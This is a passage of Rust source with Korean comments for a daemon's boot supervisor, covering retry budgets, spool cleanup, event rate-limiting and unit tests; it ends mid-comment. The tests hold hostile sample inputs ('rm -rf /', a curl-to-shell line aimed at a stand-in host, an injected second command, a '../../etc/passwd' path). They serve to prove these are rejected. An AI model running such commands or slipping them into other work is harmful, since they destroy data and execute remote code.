        // SEAL-1: 번들 python 이 `.pyc` 를 쓰면 코드서명 봉인이 깨진다.
        .env(cys::ENV_PY_NO_BYTECODE, cys::PY_NO_BYTECODE_ON)
        .stdin(std::process::Stdio::null());
    {
        use crate::state::HideConsole;
        cmd.hide_console();
    }
    match std::fs::OpenOptions::new().create(true).append(true).open(&log) {
        Ok(f) => {
            if let Ok(e) = f.try_clone() {
                cmd.stderr(e);
            }
            cmd.stdout(f);
        }
        Err(_) => {
            cmd.stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null());
        }
    }
    match cmd.spawn() {
        Ok(child) => {
            let pid = child.id().unwrap_or(0);
            // 핸들 즉시 드롭 = 기다리지 않는다(감독자 cadence 를 자식이 잡아먹지 않는다).
            drop(child);
            Ok(format!("pid={pid}"))
        }
        Err(e) => Err(format!("스폰 실패: {e}")),
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// 틱
// ══════════════════════════════════════════════════════════════════════════════

/// 태스크 로컬 예산(id → (시도 수, 마지막 시도 시각)). **단일 writer**(감독자 태스크)이며,
/// watchdog 의 형제 맵들과 같은 규약으로 매 틱 솎인다.
///
/// ★설계서는 이 예산을 `Daemon` 필드로 승격해 watchdog 의 `restart_counts` 와 **공유**하라고
/// 요구한다. 그 승격은 `state.rs`·`governance.rs` 를 건드리므로 이 단위의 파일 반경 밖이다.
/// 그래서 이 착지는 **공유가 필요한 상황 자체를 만들지 않는 쪽**으로 안전을 확보한다:
/// 감독자는 좌석·에이전트를 **재기동하지 않는다**(kill·close·launch 호출 0 — 검체 소스 핀).
/// 감독자가 낳는 것은 부트 체인 하나뿐이고 그 예산은 여기서 유계다.
type Budget = HashMap<String, (u32, f64)>;

/// 감독자 태스크의 **로컬 상태 전량**(단일 writer). 예산 하나만 들고 다니던 것을 묶은 이유는
/// 유계 장치가 셋으로 늘었기 때문이다 — 셋이 서로를 무너뜨리지 않게 한 자리에서 본다.
#[derive(Default)]
struct SupState {
    /// 인텐트별 (시도 수, 마지막 시도 시각) — 메모리측 예산.
    budget: Budget,
    /// **음성 캐시** — 지우지 못한 (경로, 사유). 같은 키로는 이벤트를 두 번 내지 않는다.
    ///
    /// ★유계의 정의처(재난 ①): 삭제가 성공하면 그 항목은 다음 틱에 다시 오지 않으므로
    /// 이벤트는 1건이다. 삭제가 **실패하면** 같은 항목이 매 틱 같은 판정으로 다시 올라오므로,
    /// 여기서 (항목, 사유)당 **정확히 1건**으로 접는다. 회수는 **파일이 실제로 사라졌을 때만**
    /// 한다 — 나이로 만료시키면 '3초마다' 가 '5분마다' 로 바뀔 뿐 유계가 아니다.
    undeletable: std::collections::HashSet<(String, &'static str)>,
    /// 예산 포화를 이미 알렸는가(1회성 래치 — 포화가 지속되면 매 틱 알리는 것이 곧 폭주다).
    budget_pressure_reported: bool,
    /// GC 회전 커서(`scan_spool`).
    cursor: usize,
}

/// 스풀 항목 1건을 지우고 **이벤트를 내도 되는지**를 함께 판정한다.
///
/// 반환 `Some(removed)` = 지금 발행하라(값은 실제 삭제 여부) · `None` = 이미 알린 사실이다.
/// 종전 코드는 `let _ = remove_file(..)` 뒤에 **무조건** 발행했다 — 지워지지 않는 항목 하나가
/// 감독자 cadence(3초)마다 영구히 이벤트를 낸다(재난 ①). Windows 가 주 경로다: 읽기전용
/// 속성·다른 프로세스가 연 파일에서 `remove_file` 이 실패하고, `ensure_spool` 의 권한
/// 재강제는 `#[cfg(unix)]` 라 거기서는 아무 것도 고치지 않는다.
fn remove_and_gate(
    st: &mut SupState,
    remover: Remover,
    p: &Path,
    why: &'static str,
) -> Option<bool> {
    let key = (p.to_string_lossy().into_owned(), why);
    if remover(p) {
        st.undeletable.remove(&key);
        return Some(true);
    }
    // 이미 알렸다 · 캐시가 찼다 → **침묵**. 캐시를 비우는 것은 폭주를 다시 여는 것과 같다.
    if st.undeletable.contains(&key) || st.undeletable.len() >= MAX_UNDELETABLE {
        return None;
    }
    st.undeletable.insert(key);
    Some(false)
}

/// 한 틱. 디스크 I/O + (있으면) 실행. **동기**이며 호출자가 `catch_unwind` 로 감싼다.
/// 반환값은 이번 틱의 디스패치 횟수(테스트가 유계성을 세는 축).
fn tick_in(
    daemon: &Arc<Daemon>,
    dir: &Path,
    st: &mut SupState,
    runner: Runner,
    remover: Remover,
    now: f64,
) -> usize {
    // ★스풀 권한 **재강제**(unix 0o700) — 있을 때만. 없으면 **만들지 않는다**:
    //   감독자는 관측자이지 생산자가 아니고, 스풀 생성은 인텐트를 적는 쪽의 일이다
    //   (지금 생산자가 없으므로 프로덕션 디스크 자국은 0 이다 = 행동 무변경).
    //   왜 여기서도 조이는가: 생산자가 셸이면(U-24) umask 에 따라 넓은 권한으로 만들 수 있다.
    //   그때 이 한 줄이 없으면 스풀은 한 번도 조여지지 않은 채로 남는다.
    if dir.exists() {
        let _ = ensure_spool(dir);
    }
    let scan = scan_spool(dir, now, st.cursor);
    st.cursor = scan.next_cursor;
    // 음성 캐시 회수 — 파일이 실제로 사라진 키만 버린다(위 필드 주석의 '나이 만료 금지').
    st.undeletable.retain(|(p, _)| Path::new(p).exists());

    // ── 디스크 GC(파싱 불가·mtime 초과) ────────────────────────────────────────
    for (p, why) in &scan.garbage {
        if let Some(removed) = remove_and_gate(st, remover, p, why) {
            publish(
                daemon,
                "boot_supervisor.intent_discarded",
                json!({"path": p.to_string_lossy(), "why": why, "removed": removed}),
            );
        }
    }

    // ── 맵 3종 방어 ────────────────────────────────────────────────────────────
    // ② 나이 만료 — 스풀에서 사라졌어도 예산은 수명만큼 기억한다(즉시 재등록으로 예산을
    //    리셋하는 우회 차단). ③ 매 틱 retain 은 아래 캡 뒤가 아니라 여기서 함께 본다.
    st.budget
        .retain(|id, (_, last)| now - *last <= INTENT_MAX_AGE_SECS || scan.present.contains(id));
    // ① 상한 — ★`clear()` 하지 않는다(결함 2a 수리).
    //   종전 주석은 "비워도 디스크측 예산이 남아 상한을 계속 집행한다" 고 했다. 그러나 두 축을
    //   **함께 둔 근거 자체**가 '읽기전용 스풀·디스크 만실에서 attempts 가 영원히 0' 인
    //   상황이다 — 바로 그 상황에서 clear 가 일어나면 두 축이 **동시에** 무너져 인텐트당
    //   3회 상한이 무력화된다(매 틱 프로세스 1개 = 폭주). 그래서 상한 집행은:
    //     ⓐ **스풀에 없는** 항목만, 오래된 것부터 솎는다(LRU — 살아있는 예산은 건드리지 않는다).
    //     ⓑ 그래도 넘치면(= 실재하는 인텐트만으로 상한 초과) **낳는 것을 멈춘다**.
    //        살아있는 예산을 버려 맵 크기를 지키는 것은 유계를 파는 것이다 — 그럴 바엔 낳지 않는다.
    //        멈춰도 스풀은 GC·Retire 로 계속 줄어들므로 이 상태는 스스로 풀린다.
    let mut suspend_dispatch = false;
    if st.budget.len() > MAX_TRACKED {
        let over = st.budget.len() - MAX_TRACKED;
        let mut evictable: Vec<(f64, String)> = st
            .budget
            .iter()
            .filter(|(id, _)| !scan.present.contains(*id))
            .map(|(id, (_, last))| (*last, id.clone()))
            .collect();
        evictable.sort_by(|a, b| a.0.total_cmp(&b.0));
        let evicted = evictable.len().min(over);
        for (_, id) in evictable.into_iter().take(over) {
            st.budget.remove(&id);
        }
        suspend_dispatch = st.budget.len() > MAX_TRACKED;
        if !st.budget_pressure_reported {
            st.budget_pressure_reported = true;
            publish(
                daemon,
                "boot_supervisor.budget_pressure",
                json!({"entries": st.budget.len(), "evicted": evicted, "cap": MAX_TRACKED,
                       "dispatch_suspended": suspend_dispatch}),
            );
        }
    }

    // ── 판정·실행 ──────────────────────────────────────────────────────────────
    let mut dispatched = 0usize;
    for it in &scan.intents {
        if dispatched >= MAX_DISPATCH_PER_TICK {
            break;
        }
        let (mem_attempts, mem_last) = st.budget.get(&it.id).copied().unwrap_or((0, 0.0));
        let attempts = effective_attempts(it.attempts, mem_attempts);
        // ★메모리측 쿨다운 — 디스크에 `next_attempt_at` 이 적히지 못했어도(읽기전용 스풀)
        //   같은 인텐트를 쿨다운 안에 다시 낳지 않는다(폭주 차단 ③).
        if mem_attempts > 0 && now < backoff_until(mem_attempts, mem_last) {
            continue;
        }
        match decide(it, attempts, now) {
            Disposition::Wait { .. } => {}
            Disposition::Retire(why) => {
                // 폐기는 예산 포화와 무관하게 계속한다 — 스풀을 줄이는 방향이기 때문이다.
                if let Some(removed) =
                    remove_and_gate(st, remover, &intent_path(dir, &it.id), why)
                {
                    publish(
                        daemon,
                        "boot_supervisor.intent_retired",
                        json!({"id": it.id, "action": it.action_token, "why": why,
                               "attempts": attempts, "removed": removed}),
                    );
                }
            }
            Disposition::Run(action) => {
                if suspend_dispatch {
                    continue; // 예산 포화 — 유계가 우선이다(낳지 않는다).
                }
                dispatched += 1;
                let next = attempts + 1;
                st.budget.insert(it.id.clone(), (next, now));
                // 디스크측 예산 선기록 — 실행 **전**에 올려 둬야 이 사이에 데몬이 죽어도
                // 다음 세대가 시도 수를 잃지 않는다(예산의 안전 방향 = 과소가 아니라 과다).
                let mut persisted = it.clone();
                persisted.attempts = next;
                persisted.next_attempt_at = backoff_until(next, now);
                let persist_err = write_intent(dir, &persisted).err();
                let outcome = dispatch_one(daemon, it, action, runner);
                match outcome {
                    Ok(detail) => {
                        let removed = remover(&intent_path(dir, &it.id));
                        publish(
                            daemon,
                            "boot_supervisor.dispatched",
                            json!({"id": it.id, "action": action.as_str(),
                                   "attempt": next, "detail": detail, "removed": removed,
                                   "persist_error": persist_err}),
                        );
                    }
                    Err(why) => {
                        if next >= MAX_ATTEMPTS {
                            let _ = remover(&intent_path(dir, &it.id));
                        }
                        publish(
                            daemon,
                            "boot_supervisor.dispatch_failed",
                            json!({"id": it.id, "action": action.as_str(),
                                   "attempt": next, "max": MAX_ATTEMPTS, "why": why,
                                   "persist_error": persist_err}),
                        );
                    }
                }
            }
        }
    }
    dispatched
}

fn publish(daemon: &Arc<Daemon>, name: &str, payload: serde_json::Value) {
    daemon.bus.publish(name, "boot_supervisor", None, payload);
}

/// 감독자 기동 — **별도 `tokio::spawn` + 자기 cadence**.
///
/// watchdog 틱 안에 두면 부트 1회가 큐 배달·승인 격상·데드맨·회수를 수십 초 정지시킨다
/// (모듈 헤더 'watchdog 틱을 절대 막지 않는다' 절). 이 함수가 `governance` 가 아니라 여기
/// 있는 것 자체가 그 계약의 구조적 표현이다.
pub fn spawn(daemon: Arc<Daemon>) {
    let off = supervisor_off_from(
        std::env::var(cys::ENV_BOOT_GATES).ok().as_deref(),
        std::env::var(ENV_SUPERVISOR).ok().as_deref(),
    );
    if off {
        eprintln!("[cysd] boot-supervisor disabled (CYS_BOOT_GATES=0 또는 CYS_BOOT_SUPERVISOR=0)");
        return;
    }
    tokio::spawn(async move {
        let dir = spool_dir(&daemon.socket_path);
        let mut st = SupState::default();
        loop {
            tokio::time::sleep(Duration::from_secs(SUPERVISOR_INTERVAL_SECS)).await;
            // 패닉 격리 — watchdog 과 같은 규약. 한 틱의 패닉이 감독자를 데몬 수명 내내
            // 조용히 없애면, 그것이 곧 '감독자 없음'(R3) 으로의 회귀다.
            let body = std::panic::AssertUnwindSafe(|| {
                tick_in(
                    &daemon,
                    &dir,
                    &mut st,
                    run_ensure_team,
                    remove_spool_file,
                    now_epoch(),
                );
            });
            if std::panic::catch_unwind(body).is_err() {
                publish(
                    &daemon,
                    "boot_supervisor.tick_panic",
                    json!({"note": "boot supervisor tick panicked; continuing next tick"}),
                );
            }
        }
    });
}

// ══════════════════════════════════════════════════════════════════════════════
#[cfg(test)]
mod tests {
    use super::*;

    /// 실 프로세스를 낳지 않는 실행자 — 항상 성공.
    fn ok_runner(_d: &Arc<Daemon>, _i: &BootIntent, _a: BootAction) -> Result<String, String> {
        Ok("test-ok".to_string())
    }
    /// 항상 실패하는 실행자(유계성 시험용).
    fn fail_runner(_d: &Arc<Daemon>, _i: &BootIntent, _a: BootAction) -> Result<String, String> {
        Err("test-fail".to_string())
    }

    /// **절대 지우지 못하는** 제거자 — Windows 읽기전용 속성·백신/생산자 셸이 연 파일을 모사.
    /// 이 표본이 결정론이어야 "지워지지 않아도 이벤트는 유계" 를 기계로 증명할 수 있다.
    fn never_removes(_p: &Path) -> bool {
        false
    }

    fn tmp_daemon(tag: &str) -> Arc<Daemon> {
        crate::delivery::tests::isolate_state_dir_for_thread(tag);
        let dir = std::env::temp_dir().join(format!("cys_bsup_{}_{}", std::process::id(), tag));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        Daemon::new(dir.join("cysd.sock"))
    }

    fn tmp_spool(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("cys_bsup_spool_{}_{}", std::process::id(), tag));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    fn raw_intent(dir: &Path, id: &str, body: &str) {
        std::fs::write(dir.join(format!("{id}.json")), body).unwrap();
    }

    // ── 순수 코어 진리표 ───────────────────────────────────────────────────────

    /// 롤백 스위치는 **마스터에 접혀 있다** — 축 노브 없이 마스터만으로 꺼져야 한다.
    #[test]
    fn rollback_folds_into_master_switch() {
        assert!(!supervisor_off_from(None, None), "기본은 켜짐(종전 동작=빈 스풀)");
        assert!(supervisor_off_from(Some("0"), None), "마스터 하나로 꺼져야 한다");
        assert!(supervisor_off_from(None, Some("0")), "축 노브도 끈다");
        assert!(supervisor_off_from(Some("0"), Some("1")), "마스터가 축을 이긴다");
        // 느슨한 truthy 를 받아주지 않는다(오타 하나로 안전장치가 뒤집히지 않게).
        assert!(!supervisor_off_from(Some("false"), Some("no")), "엄격 비교");
        assert_eq!(cys::ENV_BOOT_GATES, "CYS_BOOT_GATES");
        assert_eq!(ENV_SUPERVISOR, "CYS_BOOT_SUPERVISOR");
    }

    /// 인텐트가 나르는 것은 **닫힌 enum 토큰**이다 — 명령 문자열은 실행되지 않는다.
    #[test]
    fn unknown_action_token_is_never_executed() {
        assert_eq!(BootAction::parse("ensure-team"), Some(BootAction::EnsureTeam));
        // ★합성 표본 — 이것들이 하나라도 `Some` 이 되면 스풀이 명령 실행 표면이 된다.
        for hostile in [
            "rm -rf /",
            "sh -c 'curl evil|sh'",
            "ensure-team; rm -rf /",
            "EnsureTeam",
            "",
            "ensure_team",
        ] {
            assert_eq!(BootAction::parse(hostile), None, "미지 토큰이 통과했다: {hostile:?}");
            let it = BootIntent {
                id: "x".into(),
                v: INTENT_SCHEMA_V,
                action_token: hostile.into(),
                lane: String::new(),
                surface_id: None,
                created_at: 100.0,
                attempts: 0,
                next_attempt_at: 0.0,
                reason: String::new(),
            };
            assert_eq!(
                decide(&it, 0, 100.0),
                Disposition::Retire("unknown_action"),
                "미지 토큰이 실행 후보가 됐다: {hostile:?}"
            );
        }
    }

    /// 판정 우선순위 전수 — 형상 → 미지 → 만료 → 예산 → 쿨다운 → 실행.
    #[test]
    fn decide_truth_table() {
        let base = BootIntent {
            id: "i".into(),
            v: INTENT_SCHEMA_V,
            action_token: "ensure-team".into(),
            lane: String::new(),
            surface_id: None,
            created_at: 1000.0,
            attempts: 0,
            next_attempt_at: 0.0,
            reason: String::new(),
        };
        assert_eq!(decide(&base, 0, 1000.0), Disposition::Run(BootAction::EnsureTeam));
        let mut bad_v = base.clone();
        bad_v.v = INTENT_SCHEMA_V + 1;
        assert_eq!(decide(&bad_v, 0, 1000.0), Disposition::Retire("schema_mismatch"));
        // 만료가 예산보다 앞이다(늙은 인텐트가 예산을 태우며 프로세스를 낳지 않게).
        assert_eq!(
            decide(&base, 0, 1000.0 + INTENT_MAX_AGE_SECS + 1.0),
            Disposition::Retire("expired")
        );
        assert_eq!(
            decide(&base, MAX_ATTEMPTS, 1000.0),
            Disposition::Retire("attempts_exhausted")
        );
        let mut cooling = base.clone();
        cooling.next_attempt_at = 1200.0;
        assert_eq!(decide(&cooling, 1, 1000.0), Disposition::Wait { until: 1200.0 });
        assert_eq!(decide(&cooling, 1, 1200.0), Disposition::Run(BootAction::EnsureTeam));
    }

    /// 디스크가 거짓말해도 예산은 유계다.
    #[test]
    fn effective_attempts_takes_the_larger_budget() {
        assert_eq!(effective_attempts(0, 3), 3, "디스크 0 · 메모리 3 → 3");
        assert_eq!(effective_attempts(2, 0), 2);
        assert_eq!(effective_attempts(1, 1), 1);
    }

    /// 파일명이 되는 값이므로 경로 탈출이 불가능해야 한다.
    #[test]
    fn sanitize_id_cannot_escape_the_spool() {
        for hostile in ["../../etc/passwd", "a/b", "..", "", "  ", "x\0y"] {
            let s = sanitize_id(hostile);
            assert!(!s.contains('/'), "경로 분리자 잔존: {s:?}");
            assert!(!s.contains('\\'), "경로 분리자 잔존: {s:?}");
            assert!(!s.contains(".."), "상대참조 잔존: {s:?}");
            assert!(!s.is_empty(), "빈 파일명");
        }
        assert_eq!(sanitize_id("boot-master_1"), "boot-master_1", "정상 id 보존");
    }

    // ── 스풀·틱 (합성 표본) ────────────────────────────────────────────────────

    /// 왕복 직렬화 — 적은 것을 그대로 읽는다.
    #[test]
    fn enqueue_roundtrips() {
        let dir = tmp_spool("roundtrip");
        enqueue_in(&dir, "boot-1", BootAction::EnsureTeam, "/tmp/s.sock", Some(7), "hook", 500.0)
            .unwrap();
        let scan = scan_spool(&dir, 500.0, 0);
        assert_eq!(scan.intents.len(), 1);
        let it = &scan.intents[0];
        assert_eq!(it.id, "boot-1");
        assert_eq!(it.action_token, "ensure-team");
        assert_eq!(it.surface_id, Some(7));
        assert_eq!(it.attempts, 0);
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let m = std::fs::metadata(&dir).unwrap().permissions().mode() & 0o777;
            assert_eq!(m, 0o700, "스풀 디렉터리 권한 재강제 실패: {m:o}");
        }
    }

    /// ★유계성 — 실패하는 실행자에 대해 디스패치 총량이 `MAX_ATTEMPTS` 를 넘지 않는다.
    /// (틱을 100회 돌려도 프로세스는 3번만 태어난다.)
    #[test]
    fn retry_is_bounded_by_max_attempts() {
        let d = tmp_daemon("bounded");
        let dir = tmp_spool("bounded");
        enqueue_in(&dir, "b", BootAction::EnsureTeam, "", None, "t", 0.0).unwrap();
        let mut st = SupState::default();
        let mut total = 0usize;
        let mut now = 1.0;
        for _ in 0..100 {
            total += tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, now);
            now += 5.0; // 쿨다운을 계속 넘겨 준다 — 그래도 유계여야 한다.
        }
        assert_eq!(total, MAX_ATTEMPTS as usize, "재시도가 유계가 아니다(폭주 경로)");
        assert!(
            !intent_path(&dir, "b").exists(),
            "예산 소진 인텐트가 스풀에 남았다 — 다음 세대가 다시 태운다"
        );
    }

    /// ★읽기전용 스풀(디스크가 예산을 못 올림)에서도 유계여야 한다 — 메모리측 예산 단독 시험.
    #[test]
    fn budget_is_bounded_even_when_disk_never_persists() {
        let d = tmp_daemon("nopersist");
        let dir = tmp_spool("nopersist");
        let mut st = SupState::default();
        let mut total = 0usize;
        let mut now = 1.0;
        for _ in 0..50 {
            // 매 틱 인텐트를 attempts=0 으로 되살린다 = 디스크 예산이 영원히 오르지 않는 상황.
            raw_intent(
                &dir,
                "z",
                &format!(
                    r#"{{"v":{INTENT_SCHEMA_V},"action":"ensure-team","lane":"","surface_id":null,
                        "created_at":0.0,"attempts":0,"next_attempt_at":0.0,"reason":"t"}}"#
                ),
            );
            total += tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, now);
            now += 5.0;
        }
        assert!(
            total <= MAX_ATTEMPTS as usize,
            "디스크 예산이 오르지 않는 상황에서 {total}회 디스패치 — 메모리측 유계가 없다(폭주)"
        );
    }

    /// 틱당 디스패치 상한 — 스풀 홍수가 한 틱에 프로세스 떼를 낳지 않는다.
    #[test]
    fn dispatch_per_tick_is_capped() {
        let d = tmp_daemon("flood");
        let dir = tmp_spool("flood");
        for i in 0..40 {
            enqueue_in(&dir, &format!("f{i:03}"), BootAction::EnsureTeam, "", None, "t", 0.0)
                .unwrap();
        }
        let mut st = SupState::default();
        let n = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0);
        assert_eq!(n, MAX_DISPATCH_PER_TICK, "틱당 상한 위반 — 폭주 차단 실패");
    }

    /// 성공하면 인텐트는 사라진다(재실행 0).
    #[test]
    fn success_retires_the_intent() {
        let d = tmp_daemon("success");
        let dir = tmp_spool("success");
        enqueue_in(&dir, "s", BootAction::EnsureTeam, "", None, "t", 0.0).unwrap();
        let mut st = SupState::default();
        assert_eq!(tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0), 1);
        assert!(!intent_path(&dir, "s").exists(), "성공 후에도 인텐트가 남았다");
        assert_eq!(tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 100.0), 0, "재실행이 일어났다");
    }

    /// 합성 표본 — 적대적/깨진 인텐트는 **실행되지 않고** 사라진다.
    #[test]
    fn hostile_and_broken_intents_are_discarded_without_running() {
        let d = tmp_daemon("hostile");
        let dir = tmp_spool("hostile");
        raw_intent(&dir, "cmd", r#"{"v":1,"action":"rm -rf /","created_at":0.0}"#);
        raw_intent(&dir, "oldv", r#"{"v":99,"action":"ensure-team","created_at":0.0}"#);
        raw_intent(&dir, "junk", "not json at all");
        raw_intent(&dir, "noact", r#"{"v":1,"created_at":0.0}"#);
        std::fs::write(dir.join("ignored.log"), "log line").unwrap();
        let mut st = SupState::default();
        // 실행자가 불리면 즉시 실패시켜 '실행 0' 을 증명한다.
        fn never(_d: &Arc<Daemon>, _i: &BootIntent, _a: BootAction) -> Result<String, String> {
            panic!("적대적/깨진 인텐트가 실행됐다 — 스풀이 명령 실행 표면이 됐다");
        }
        assert_eq!(tick_in(&d, &dir, &mut st, never, remove_spool_file, 1.0), 0);
        for id in ["cmd", "oldv", "junk", "noact"] {
            assert!(!intent_path(&dir, id).exists(), "{id} 가 스풀에 남았다");
        }
        assert!(dir.join("ignored.log").exists(), "인텐트가 아닌 파일을 지웠다");
    }

    /// 디스크 mtime GC — **파싱은 되지만 파일이 늙은** 인텐트가 사라진다.
    ///
    /// ★검체 설계 주의(계측 타당성 실측 2026-08-24): 처음엔 본문을 `{ broken` 으로 두었는데,
    /// 그러면 `unparsable` 경로가 같은 파일을 지워 **mtime GC 를 통째로 떼어내도 초록**이었다
    /// (두 경로가 같은 표본을 덮어 판정이 공전). 그래서 표본을 "파싱 성공 · `created_at` 은
    /// 미래라 `expired` 도 아님 · 그러나 **파일 mtime 이 늙음**" 으로 좁혀, mtime GC 만이
    /// 지울 수 있는 상태로 만든다. 실행자는 실패자다 — GC 가 없으면 인텐트가 **실행되고**
    /// 파일도 남으므로 두 축(디스패치 0 · 파일 부재)이 동시에 무너진다.
    #[test]
    fn stale_files_are_gc_ed_by_mtime() {
        let d = tmp_daemon("mtimegc");
        let dir = tmp_spool("mtimegc");
        // 파일 mtime = '지금'. 판정 시각을 수명 너머로 주되 `created_at` 도 같이 옮겨
        // `expired`(decide) 가 아니라 **mtime GC**(scan) 만이 유일한 제거 경로가 되게 한다.
        let future = now_epoch() + INTENT_MAX_AGE_SECS + 60.0;
        raw_intent(
            &dir,
            "old",
            &format!(
                r#"{{"v":{INTENT_SCHEMA_V},"action":"ensure-team","lane":"","surface_id":null,
                    "created_at":{future},"attempts":0,"next_attempt_at":0.0,"reason":"t"}}"#
            ),
        );
        let mut st = SupState::default();
        let n = tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, future);
        assert_eq!(n, 0, "mtime 이 늙은 인텐트가 실행됐다 — mtime GC 미동작");
        assert!(!intent_path(&dir, "old").exists(), "mtime GC 미동작(파일 잔존)");
    }

    /// 감독자는 스풀을 **만들지 않는다**(생산자의 일). 있으면 권한만 조인다.
    #[test]
    fn tick_never_creates_the_spool_but_tightens_it_when_present() {
        let d = tmp_daemon("perm");
        let root = tmp_spool("perm");
        let missing = root.join("nope");
        let mut st = SupState::default();
        tick_in(&d, &missing, &mut st, ok_runner, remove_spool_file, 1.0);
        assert!(!missing.exists(), "감독자가 스풀을 만들었다 — 프로덕션 디스크 자국 0 계약 위반");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            // 생산자가 넓은 권한으로 만든 스풀을 모사한다(셸 umask 경로 · U-24).
            std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o777)).unwrap();
            tick_in(&d, &root, &mut st, ok_runner, remove_spool_file, 1.0);
            let m = std::fs::metadata(&root).unwrap().permissions().mode() & 0o777;
            assert_eq!(m, 0o700, "틱이 스풀 권한을 재강제하지 않았다: {m:o}");
        }
    }

    /// 파싱 불가 인텐트는 **mtime 과 무관하게** 즉시 폐기된다(위 검체가 좁힌 축의 형제 축).
    #[test]
    fn unparsable_files_are_discarded_regardless_of_mtime() {
        let d = tmp_daemon("unparsable");
        let dir = tmp_spool("unparsable");
        raw_intent(&dir, "junk", "{ broken");
        let mut st = SupState::default();
        let n = tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, now_epoch());
        assert_eq!(n, 0, "깨진 인텐트가 실행됐다");
        assert!(!intent_path(&dir, "junk").exists(), "깨진 인텐트가 스풀에 남았다");
    }

    /// 예산 맵 3종 방어 — 상한 초과 시 통째로 비운다.
    #[test]
    fn budget_map_is_capped_and_pruned() {
        let d = tmp_daemon("mapcap");
        let dir = tmp_spool("mapcap");
        let mut st = SupState::default();
        let now = 10_000.0;
        for i in 0..(MAX_TRACKED + 10) {
            st.budget.insert(format!("k{i}"), (1, now));
        }
        tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, now);
        assert!(st.budget.len() <= MAX_TRACKED, "상한 방어 실패: {}", st.budget.len());
        // 나이 만료 — 스풀에 없고 늙은 항목은 다음 틱에 사라진다.
        st.budget.insert("aged".into(), (1, 0.0));
        tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, INTENT_MAX_AGE_SECS + 10.0);
        assert!(!st.budget.contains_key("aged"), "나이 만료 방어 실패");
    }

    // ── ★유계성 검체 (재난 ① 이벤트 폭주) ─────────────────────────────────────
    //
    // 아래 셋의 계수기는 전부 **버스**(`daemon.bus.latest_seq()`)다 — `tick_in` 의 반환값이
    // 아니다. 산출자가 자기 산출물의 통과를 판정하지 않는다는 규율의 이 파일 판본이며,
    // 발행 경로를 하나라도 우회해 넣으면 그 순간 카운트가 어긋나 적색이 된다.

    /// ★삭제가 **계속 실패해도** 이벤트 총량은 유계다 (결함 1).
    ///
    /// 종전 구현은 `let _ = remove_file(..)` 뒤에 **무조건** 발행했다. 지워지지 않는 항목
    /// 하나가 감독자 cadence(3초)마다 영구히 이벤트를 낸다 = 재난 ① 그 자체이며, 스풀이
    /// 읽기전용이 되는 Windows 가 주 경로다(`ensure_spool` 의 권한 재강제는 `#[cfg(unix)]`).
    ///
    /// 두 삭제 경로(garbage GC · Retire)를 **함께** 건다 — 한쪽만 고치면 다른 쪽이 계속 샌다.
    #[test]
    fn undeletable_spool_entries_do_not_publish_forever() {
        let d = tmp_daemon("undeletable");
        let dir = tmp_spool("undeletable");
        raw_intent(&dir, "junk", "{ broken"); // ① 파싱 불가 → garbage GC 축
        raw_intent(&dir, "unknown", r#"{"v":1,"action":"rm -rf /","created_at":0.0}"#); // ② Retire 축
        let mut st = SupState::default();
        let before = d.bus.latest_seq();
        for _ in 0..200 {
            assert_eq!(
                tick_in(&d, &dir, &mut st, fail_runner, never_removes, 1.0),
                0,
                "지워지지 않는 쓰레기가 실행 후보가 됐다"
            );
        }
        let published = d.bus.latest_seq() - before;
        assert_eq!(
            published, 2,
            "삭제 실패 항목 2건이 200틱 동안 이벤트 {published}건을 냈다 \
             — 항목당 1건(사실은 알리되 반복하지 않는다)이어야 한다(재난 ①)"
        );
        // ★침묵도 실패다 — 지워지지 않는 스풀 항목은 **한 번은** 알려야 한다.
        assert!(published > 0, "삭제 실패를 통째로 삼켰다 — 무음 실패");
    }

    /// ★예산 맵 상한 집행이 **살아있는 인텐트의 예산을 리셋하지 않는다** (결함 2a).
    ///
    /// 시나리오는 두 축(디스크·메모리)을 함께 둔 **바로 그 이유**다: 스풀이 읽기전용이라
    /// 디스크측 `attempts` 가 영원히 0 이고(디스크 축 붕괴), 그 상태에서 예산 맵이 상한을
    /// 넘는다. 종전 구현은 그때 맵을 `clear()` 해 **메모리 축까지 함께** 무너뜨렸다 —
    /// 남는 유계가 하나도 없어 인텐트 하나가 매 틱 프로세스를 낳는다.
    #[test]
    fn budget_cap_never_resets_a_live_intents_budget() {
        let d = tmp_daemon("capreset");
        let dir = tmp_spool("capreset");
        let mut st = SupState::default();
        let mut total = 0usize;
        let mut now = 1.0;
        for tick in 0..60 {
            // 디스크가 예산을 못 올리는 상황 — 매 틱 attempts=0 으로 되살아난다.
            raw_intent(
                &dir,
                "live",
                &format!(
                    r#"{{"v":{INTENT_SCHEMA_V},"action":"ensure-team","lane":"","surface_id":null,
                        "created_at":{now},"attempts":0,"next_attempt_at":0.0,"reason":"t"}}"#
                ),
            );
            // 맵을 매 틱 상한 너머로 밀어 올린다(인텐트가 쏟아지는 24/365 데몬의 형태).
            for i in 0..(MAX_TRACKED + 10) {
                st.budget.insert(format!("t{tick}k{i}"), (1, now));
            }
            total += tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, now);
            now += 5.0;
        }
        assert!(
            total <= MAX_ATTEMPTS as usize,
            "예산 맵 상한 집행이 살아있는 인텐트의 예산까지 지웠다 — {total}회 디스패치 \
             (인텐트당 {MAX_ATTEMPTS}회 상한 무력화 = 폭주)"
        );
        assert!(
            st.budget.len() <= MAX_TRACKED + MAX_DISPATCH_PER_TICK,
            "예산 맵이 상한 위로 자란다: {} (누수)",
            st.budget.len()
        );
    }

    /// ★GC 는 **판정 상한과 독립**으로 돈다 (결함 2b).
    ///
